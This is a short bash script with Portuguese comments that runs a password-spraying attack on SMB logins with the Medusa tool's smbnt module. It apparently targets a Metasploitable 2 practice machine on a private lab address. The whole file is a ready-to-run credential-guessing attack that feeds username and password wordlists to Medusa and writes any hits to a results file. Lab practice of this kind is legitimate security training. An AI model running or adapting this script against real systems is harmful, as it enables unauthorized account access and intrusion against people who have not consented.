#!/bin/bash

# Script para ataque de password spraying SMB com Medusa

TARGET="192.168.56.102" # Substitua pelo IP do Metasploitable 2
USERLIST="wordlists/usernames.txt"
PASSLIST="wordlists/passwords.txt" # Para password spraying, esta wordlist geralmente contém apenas uma ou poucas senhas comuns

echo "Iniciando ataque de password spraying SMB contra $TARGET..."
# Para SMB, o Medusa usa o módulo smbnt. É comum primeiro enumerar usuários antes de fazer password spraying.
# Este exemplo assume que você já tem uma lista de usuários válidos.
medusa -h $TARGET -U $USERLIST -P $PASSLIST -M smbnt -t 5 -O smb_results.txt
echo "Ataque SMB concluído. Resultados salvos em smb_results.txt"
